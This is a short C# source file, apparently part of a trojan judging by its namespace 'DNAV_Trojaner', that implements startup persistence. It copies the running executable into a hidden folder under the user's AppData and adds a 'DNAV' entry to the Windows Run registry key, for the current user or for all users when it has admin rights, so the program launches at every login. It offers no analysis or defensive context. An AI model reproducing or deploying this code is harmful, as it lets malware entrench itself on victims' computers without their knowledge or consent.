using Microsoft.Win32;
using System.Windows.Forms;
using System.IO;
using System;

namespace DNAV_Trojaner
{
    class Startup
    {
        public static void Enable()
        {
            string src = Application.ExecutablePath;
            string file = Path.GetFileName(src);
            string dst = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Tofu\";

            Directory.CreateDirectory(dst);
            File.Copy(src, dst + file);
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);

            key.SetValue("DNAV", dst.ToString() + file);
            key.Close();
        }

        public static void Disable()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.DeleteValue("DNAV", false);
        }

        public static void EnableForAdmin()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("DNAV", Application.ExecutablePath.ToString());
            key.Close();
        }

        public static void DisableForAdmin()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key.DeleteValue("DNAV", false);
        }
    }
}
